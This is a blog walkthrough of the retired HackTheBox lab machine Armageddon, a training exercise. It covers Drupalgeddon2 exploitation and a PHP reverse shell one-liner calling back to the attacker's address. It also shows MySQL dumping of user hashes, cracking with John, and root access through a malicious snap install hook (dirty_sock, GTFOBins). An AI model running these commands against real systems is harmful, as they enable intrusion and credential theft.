---
layout: walkthrough
title: HackTheBox - Armageddon
date: 2021-07-25 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/armageddon.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Armageddon --`10.10.10.233`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bash
vagrant@ko:~/Desktop/HackTheBox/Armageddon$ nmap -sC -sV 10.10.10.233
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 11:00 EDT
Nmap scan report for 10.10.10.233
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)

80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.64 seconds

```

</details>


From the output shown above, we can see that the machine is a Linux machine. Looking at the output of the nmap scan, it seemed as if the `robots.txt` file contained a lot of information. After browsing to the URL I was presented with the following information:

<details>

```text
#
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html

User-agent: \*
Crawl-delay: 10
# CSS, JS, Images
Allow: /misc/\*.css$
Allow: /misc/\*.css?
Allow: /misc/\*.js$
Allow: /misc/\*.js?
Allow: /misc/\*.gif
Allow: /misc/\*.jpg
Allow: /misc/\*.jpeg
Allow: /misc/\*.png
Allow: /modules/\*.css$
Allow: /modules/\*.css?
Allow: /modules/\*.js$
Allow: /modules/\*.js?
Allow: /modules/\*.gif
Allow: /modules/\*.jpg
Allow: /modules/\*.jpeg
Allow: /modules/\*.png
Allow: /profiles/\*.css$
Allow: /profiles/\*.css?
Allow: /profiles/\*.js$
Allow: /profiles/\*.js?
Allow: /profiles/\*.gif
Allow: /profiles/\*.jpg
Allow: /profiles/\*.jpeg
Allow: /profiles/\*.png
Allow: /themes/\*.css$
Allow: /themes/\*.css?
Allow: /themes/\*.js$
Allow: /themes/\*.js?
Allow: /themes/\*.gif
Allow: /themes/\*.jpg
Allow: /themes/\*.jpeg
Allow: /themes/\*.png

# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/

# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php

# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/

# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

</details>

Now that I had a list of new directories, I first browsed to the application's homepage to determine what the server was hosting:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/img1.png"  style="width: 80%" />
</p>


I hadn't heard or Armageddon before so I did some quick Google searches and identified vulnerabilities within the Drupal implementation which would allow an attacker to gain Remote Code Execution (RCE) privileges to the host as shown in this advisory: <https://www.drupal.org/sa-core-2020-005>.

> Drupal 8 and 9 have a remote code execution vulnerability under certain circumstances.
> An attacker could trick an administrator into visiting a malicious site that could result in creating a carefully named directory on the file system. With this directory in place, an attacker could attempt to brute force a remote code execution vulnerability.

I searched for any PoC's and came across the following Github link: <https://github.com/dreadlocked/Drupalgeddon2>. I ran the code and retrieve a fake shell back -- the shell itself was a simple webshell as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/img2.png"  style="width: 80%" />
</p>


## Lateral Movement using Apache

I now had access to the host and I checked `/etc/passwd` to view which users were active on the machine. Since I had access to the host, I did a simple `grep -R password` and found the following:

```text
sites/default/settings.php:      'password' => 'CQHEy@9M*m23gBVj',
```

Going into the actual file, I came across the following credentials:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/img3.png"  style="width: 80%" />
</p>


Since it was a webshell, I was unable to access MySQL, so I created a reverse shell using the following PHP command:

```php
php -r '$sock=fsockopen("10.10.14.157",80);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

Now that I had a proper shell, I could finally log into the MySQL database using the following command: 

```bash
mysql -u drupaluser -D drupal -p 
```

The issue that I had here was that my shell would freeze everytime that I logged in to the instance. In order to get around this issue, I used the commands directly from the shell:

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal; show tables;"
```

There were a large number of tables within the application, but the one that I was interested in was `users`. After identifying the correct table, I selected all the data from the table using the following command:

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal; select * from users\G;"
```


The `\G` flag simply displays the results vertically instead of in tabular format for easier reading. There were a few entries but the one that I was interested in is shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/img4.png"  style="width: 80%" />
</p>


```text
uid: 1                                                                                          
name: brucetherealadmin                                                                               
pass: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt                                         
mail: admin@armageddon.eu                    
theme:                                        
signature:                                        
signature_format: filtered_html                          
created: 1606998756                             
access: 1607077194                                                                                      
login: 1607076276                                                                                      
status: 1                                      
timezone: Europe/London                                                                                   
language:                                        
picture: 0                                                                                               
init: admin@armageddon.eu                                                                             
data: a:1:{s:7:"overlay";i:1;}  
			
```

Now that I had the users hash, I tried to crack it using JohnTheRipper:

```bash
vagrant@ko:~/Desktop/HackTheBox/Armageddon$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
1g 0:00:00:00 DONE (2021-04-15 09:31) 3.225g/s 774.1p/s 774.1c/s 774.1C/s tiffany..chris
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Success! As shown above, I now had new credentials which I could use to authenticate to the host: `brucetherealadmin:booboo`.


## Privilege Escalation using BruceTheRealAdmin


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/img5.png"  style="width: 80%" />
</p>


Since I had access to the host, I started off with doing some basic enumeration:

```bash
[brucetherealadmin@armageddon ~]$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
Linux armageddon.htb 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
armageddon.htb
 
id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
ifconfig:
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.233  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::7648:5ea1:5371:b3b5  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::69d1:bb00:780c:f997  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:f4:47  txqueuelen 1000  (Ethernet)
        RX packets 214783  bytes 19872843 (18.9 MiB)
        RX errors 0  dropped 135  overruns 0  frame 0
        TX packets 200277  bytes 29552190 (28.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 320  bytes 32208 (31.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 320  bytes 32208 (31.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 
groups:
brucetherealadmin

```

Additionally, since I knew the user's password, I ran the `sudo -l` command:


```bash
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *

```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/img6.png"  style="width: 80%" />
</p>


I knew that the user was able to exploit `snap install` so I searched in GTFO Bins and came across the following: <https://gtfobins.github.io/gtfobins/snap/>.

The code below is meant to run commands using a specially crafted Snap package. Generate it with fpm and upload it to the target.

```bash
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n x -s dir -t snap -a all meta
```

From there, it can be exploited using the following command:

```bash
sudo snap install x_1.0_all.snap --dangerous --devmode
```

However, fpm was not installed on the host. I continued enumerating and 

```bash
[brucetherealadmin@armageddon ~]$ snap version
snap    2.47.1-1.el7
snapd   2.47.1-1.el7
series  16
centos  7
kernel  3.10.0-1160.6.1.el7.x86_64
```

A simple searchsploit search showed two potential "dirty_sock" exploits. Looking at the code, it contained a ShellCode function which did the following:

> The following global is a base64 encoded string representing an installable snap package. The snap itself is empty and has no functionality. It does, however, have a bash-script in the install hook that will create a new user.

So, theoretically, that should create a new user with the following credentials:
* username: dirty_sock
* password: dirty_sock

I created a `.snap` file by decoding the Shell Code using the following command:

``` 
echo -n 'SHELL_CODE' |base64 -d > evil.snap
```

From there, I simply installed the package and authenticated as the root user with the following commands:

```bash
sudo /usr/bin/snap install --dangerous --devmode /tmp/evil.snap
su dirty_sock
sudo su
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Armageddon/img7.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.